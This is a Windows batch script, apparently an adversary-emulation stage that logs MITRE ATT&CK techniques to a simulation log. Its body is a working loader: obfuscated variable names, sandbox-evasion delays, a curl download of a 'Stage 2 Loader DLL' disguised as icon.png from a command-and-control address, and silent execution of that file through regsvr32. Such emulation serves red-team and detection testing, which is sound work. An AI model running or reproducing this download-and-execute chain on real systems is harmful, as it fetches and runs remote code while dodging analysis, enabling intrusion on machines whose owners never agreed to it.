@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM Placeholder constants - each stored once with random variable
REM ============================================================
SET fg7hkjf=%APPDATA%\10820\28c672f0
SET yt8mnbvc=01c008e8.txt
SET iu9okmnb=https://10.0.0.49/stage/2/icon.png?10820-7
SET qazwsxed=BALAM-S2BO
SET rfvgyhnj=10820
SET tgbzhnji=7
SET lkjhgvfd=%PUBLIC%\\macula-simulations.log

REM ============================================================
REM Timestamp capture for debug logging (once at script start)
REM ============================================================
SET tsvar=!DATE!/!TIME!

REM ============================================================
REM Phase 0: Initial sandbox evasion delay (10-20 sec)
REM ============================================================
ping -n 15 127.0.0.1 >nul

REM ============================================================
REM Phase 1: Heartbeat fetch - download Stage 2 Loader DLL from C2
REM ============================================================
echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: heartbeat_start>> "!lkjhgvfd!" 2>nul
curl -k -s -o "!fg7hkjf!\!yt8mnbvc!" "!iu9okmnb!"
if %errorlevel% equ 0 (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: heartbeat_complete>> "!lkjhgvfd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: heartbeat_fail>> "!lkjhgvfd!" 2>nul
)

REM ============================================================
REM Phase 2: Anti-analysis delay (5-15 sec) - CHOICE method
REM ============================================================
CHOICE /C Y /N /D Y /T 8 >nul

REM ============================================================
REM Phase 3: Change working directory to output directory
REM ============================================================
echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: chdir_start>> "!lkjhgvfd!" 2>nul
cd /d "!fg7hkjf!" >nul 2>&1
if %errorlevel% equ 0 (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: chdir_result=0>> "!lkjhgvfd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: chdir_result=1>> "!lkjhgvfd!" 2>nul
)

REM ============================================================
REM Phase 4: Random delay (10-30 sec) - via computed variable
REM ============================================================
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM ============================================================
REM Phase 5: Invoke Stage 2 Loader DLL via regsvr32.exe (LOLBIN)
REM ============================================================
echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: regsvr32_start>> "!lkjhgvfd!" 2>nul
regsvr32.exe /s "!yt8mnbvc!"
if %errorlevel% equ 0 (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: regsvr32_result=0>> "!lkjhgvfd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!qazwsxed!][!rfvgyhnj!]: regsvr32_result=1>> "!lkjhgvfd!" 2>nul
)

REM ============================================================
REM Phase 6: TTP logging (two TTPs in order)
REM ============================================================
REM T1497 | Virtualization/Sandbox Evasion
echo [!tsvar!][TTP][!qazwsxed!][!rfvgyhnj!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!lkjhgvfd!" 2>nul

REM T1218 | System Binary Proxy Execution
echo [!tsvar!][TTP][!qazwsxed!][!rfvgyhnj!]: T1218|System Binary Proxy Execution=OK:>> "!lkjhgvfd!" 2>nul

REM ============================================================
REM Phase 7: Final delay before exit (5-15 sec)
REM ============================================================
timeout /t 12 /nobreak >nul

endlocal